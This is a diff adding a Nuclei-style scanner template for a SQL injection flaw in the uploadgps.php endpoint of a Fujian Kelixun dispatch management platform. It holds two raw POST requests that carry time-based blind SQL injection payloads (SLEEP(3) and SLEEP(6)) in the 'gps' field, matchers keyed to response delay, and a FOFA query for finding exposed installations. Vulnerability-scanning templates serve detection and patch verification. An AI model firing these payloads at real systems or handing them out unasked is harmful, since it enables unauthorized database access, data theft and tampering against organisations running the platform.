@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - duration_1>=3 && duration_1<=4
+            - duration_2>=6 && duration_2<=7
+          type: dsl
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /api/client/task/uploadgps.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(3)))ozYR)+AND+'fqDZ'='fqDZ&number=
+        - |
+          POST /api/client/task/uploadgps.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(6)))ozYR)+AND+'fqDZ'='fqDZ&number=
+id: kelixun-uploadgps-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="指挥调度管理平台"
+        福建科立讯通信有限公司指挥调度管理平台uploadgps.php接口处存在SQL注入漏洞。这可能导致泄露敏感数据、破坏数据库完整性，甚至获取对数据库的完全控制。
+    name: 福建科立讯通信有限公司指挥调度管理平台uploadgps.php接口处存在SQL注入漏洞
+    reference:
+        - https://blog.csdn.net/m0_60571842/article/details/140069404
+    severity: high
+    tags:
+        - GPS
+        - 指挥调度管理平台
